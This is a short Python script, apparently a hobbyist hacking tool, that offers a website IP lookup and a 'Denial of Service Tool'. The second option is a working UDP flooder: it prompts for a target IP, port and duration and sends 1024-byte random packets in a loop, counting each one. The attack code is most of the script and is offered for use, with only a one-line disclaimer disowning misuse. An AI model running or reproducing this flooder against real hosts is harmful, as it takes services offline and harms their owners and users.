import threading
import socket
import sys
import time
import random
import os
import colorama
from colorama import Fore,Back, Style
print(Fore.MAGENTA)

print(r""" _______  _______ 
(  ____ \/ ___   )
| (    \/\/   )  |
| |          /   )
| |         /   / 
| |        /   /  
| (____/\ /   (_/\
(_______/(_______/""")
print("\n****************************************************************")
print("\n* Socials                                                      *")
print("\n* https://www.twitter.com/Cahzoh                               *")
print("\n* https://www.github.com/Cahzoh                                *")
print("\n****************************************************************")
print('\n')
print("This script is NOT meant to be used in any malicious way, I am not responsible how you use this.")
print('\n')
print("Choose option [1] or option [2]")
print('\n')
option = input("Website IP Lookup [1] Denial of Service Tool [2] :")

if option == '1':
    target = input("Enter website address :")
    print("Target IP is", socket.gethostbyname(target))
elif option == '2':

    print(r""" ______   _______  _______ 
(  __  \ (  ___  )(  ____ \
| (  \  )| (   ) || (    \/
| |   ) || |   | || (_____ 
| |   | || |   | |(_____  )
| |   ) || |   | |      ) |
| (__/  )| (___) |/\____) |
(______/ (_______)\_______)

""")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
print("cz's Denial of Service Tool")

print('\n')

ip_add_entered = input("Enter the target IP address :")

p0rt = int(input("Enter the target port address :"))

duration = int(input("Enter the duration of attack :"))

tout = time.time() + duration

sent = 0

while True:
    try:
        if time.time() > tout:
            break
        else:
            pass
        sock.sendto(bytes, (ip_add_entered, p0rt))
        sent = sent + 1
        print("Sent packets", (sent, ip_add_entered, p0rt))
    except KeyboardInterrupt:
        exit()

